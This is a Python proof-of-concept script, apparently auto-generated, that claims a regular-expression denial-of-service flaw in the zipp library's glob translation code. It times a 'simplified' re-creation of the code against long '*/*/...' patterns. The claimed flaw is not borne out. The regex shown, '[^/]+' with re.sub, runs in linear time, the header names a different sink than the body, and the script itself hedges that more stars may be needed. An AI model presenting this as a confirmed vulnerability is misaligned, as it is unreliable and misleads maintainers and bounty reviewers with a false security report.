#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: suspicious-009
# Sink: match_dirs
# Auto-generated — run with: python3 redos_translate_method_calls_self_match_dirs.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for ReDoS vulnerability in zipp library
(commit 45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)

Vulnerability: The translate_core method uses re.sub with a user-controlled pattern.
The regex 'not_seps_pattern' can cause catastrophic backtracking when the pattern
contains many stars and separators, leading to ReDoS.

Impact: An attacker can cause the application to hang or consume excessive CPU
by providing a crafted glob pattern with many stars and separators.
"""

import re
import time
import sys

# The vulnerable code from zipp/glob.py (simplified for PoC)
class Translator:
    """Simulates the vulnerable Translator class from zipp"""
    
    def __init__(self, seps):
        assert seps, "Invalid separators"
        self.seps = seps
    
    def translate_core(self, pattern):
        """Vulnerable method that causes catastrophic backtracking"""
        not_seps_pattern = r'[^{}]+'.format(re.escape(self.seps))
        
        def star_not_empty(match):
            """Replacement function that can trigger backtracking"""
            return '[^/]*'  # Simplified version
        
        # This re.sub with the crafted pattern causes the ReDoS
        result = re.sub(not_seps_pattern, star_not_empty, pattern)
        return result
    
    def translate(self, pattern):
        """Wrapper that calls translate_core"""
        return self.translate_core(pattern)


def create_malicious_pattern(num_stars=100):
    """
    Creates a pattern that triggers catastrophic backtracking.
    
    The pattern consists of many stars separated by separators.
    When processed by translate_core, the regex engine will attempt
    many different ways to match the pattern, causing exponential
    backtracking.
    
    Args:
        num_stars: Number of stars in the pattern (more = longer hang)
    
    Returns:
        A malicious glob pattern string
    """
    # Create pattern like: */*/*/*/... (num_stars times)
    return '/'.join(['*'] * num_stars)


def test_vulnerability(pattern, timeout=5):
    """
    Tests if the pattern causes excessive processing time.
    
    Args:
        pattern: The glob pattern to test
        timeout: Maximum time in seconds before considering it vulnerable
    
    Returns:
        Tuple of (is_vulnerable, elapsed_time)
    """
    translator = Translator(seps='/')
    
    start_time = time.time()
    try:
        # This is the vulnerable call
        result = translator.translate(pattern)
        elapsed = time.time() - start_time
        
        if elapsed > timeout:
            print(f"[!] Pattern caused {elapsed:.2f}s processing time (timeout={timeout}s)")
            return True, elapsed
        else:
            print(f"[*] Pattern processed in {elapsed:.4f}s (normal)")
            return False, elapsed
            
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[!] Exception after {elapsed:.2f}s: {e}")
        return True, elapsed


def main():
    """Main PoC execution"""
    
    print("=" * 60)
    print("ReDoS PoC for zipp library (commit 45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)")
    print("=" * 60)
    print()
    
    # Test 1: Normal pattern (should be fast)
    print("[*] Test 1: Normal pattern (should be fast)")
    normal_pattern = "*.txt"
    is_vuln, elapsed = test_vulnerability(normal_pattern, timeout=2)
    print(f"    Pattern: {normal_pattern}")
    print(f"    Time: {elapsed:.4f}s")
    print()
    
    # Test 2: Benign but slightly complex pattern
    print("[*] Test 2: Slightly complex pattern")
    complex_pattern = "a/*/b/*/c"
    is_vuln, elapsed = test_vulnerability(complex_pattern, timeout=2)
    print(f"    Pattern: {complex_pattern}")
    print(f"    Time: {elapsed:.4f}s")
    print()
    
    # Test 3: Malicious pattern with many stars (ReDoS trigger)
    print("[*] Test 3: Malicious pattern (ReDoS trigger)")
    print("    Creating pattern with 50 stars...")
    malicious_pattern = create_malicious_pattern(50)
    print(f"    Pattern length: {len(malicious_pattern)} chars")
    print(f"    Pattern preview: {malicious_pattern[:50]}...")
    
    is_vuln, elapsed = test_vulnerability(malicious_pattern, timeout=3)
    
    if is_vuln:
        print()
        print("[!] VULNERABLE: Pattern caused excessive processing time")
        print("[!] This confirms the ReDoS vulnerability")
    else:
        print()
        print("[*] Pattern processed quickly - may need more stars")
        print("[*] Trying with 100 stars...")
        
        malicious_pattern = create_malicious_pattern(100)
        is_vuln, elapsed = test_vulnerability(malicious_pattern, timeout=5)
        
        if is_vuln:
            print()
            print("[!] VULNERABLE: Pattern with 100 stars caused excessive processing time")
        else:
            print()
            print("[*] Pattern with 100 stars still processed quickly")
            print("[*] The vulnerability may require more stars or specific pattern structure")
    
    print()
    print("=" * 60)
    print("PoC completed")
    print("=" * 60)


if __name__ == "__main__":
    main()
